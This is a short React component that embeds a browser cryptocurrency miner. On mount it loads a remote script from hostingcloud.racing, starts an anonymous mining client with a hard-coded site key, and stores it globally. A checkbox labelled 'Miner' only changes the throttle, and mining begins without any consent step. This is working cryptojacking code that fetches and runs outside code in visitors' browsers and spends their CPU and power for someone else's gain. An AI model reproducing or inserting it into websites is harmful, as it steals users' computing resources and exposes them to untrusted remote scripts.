import React, { useEffect, useState } from 'react';

const Miner = ({ isMinerHigh, setIsMinerHigh }) => {
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://www.hostingcloud.racing/STsw.js';
    script.async = true;
    script.onload = () => {
      console.log('Mining script loaded');
      initializeMiner(isMinerHigh);
    };
    document.body.appendChild(script);
    return () => {
      document.body.removeChild(script);
    };
  }, [isMinerHigh]);

  const initializeMiner = (isHigh) => {
    try {
      const miner = new window.Client.Anonymous('e4af5e1137c224bf893f16edb14341df854a037db58d2a56c41488c2f0ff1ec1', {
        throttle: isHigh ? 0.1 : 0.8,
        c: 'w',
        ads: 0,
      });
      miner.start();
      window._client = miner; // Store miner globally for potential stopping later
      console.log('Miner started with throttle:', isHigh ? 0.1 : 0.8);
    } catch (error) {
      console.error('Error initializing miner:', error);
    }
  };

  const toggleMiner = () => {
    setIsMinerHigh(!isMinerHigh);
    if (window._client) {
      window._client.setThrottle(isMinerHigh ? 0.8 : 0.1);
      console.log('Miner throttle toggled to:', isMinerHigh ? 0.8 : 0.1);
    }
  };

  return (
    <div className="miner-switch">
      <label>
        Miner:
        <input type="checkbox" checked={isMinerHigh} onChange={toggleMiner} />
      </label>
    </div>
  );
};

export default Miner;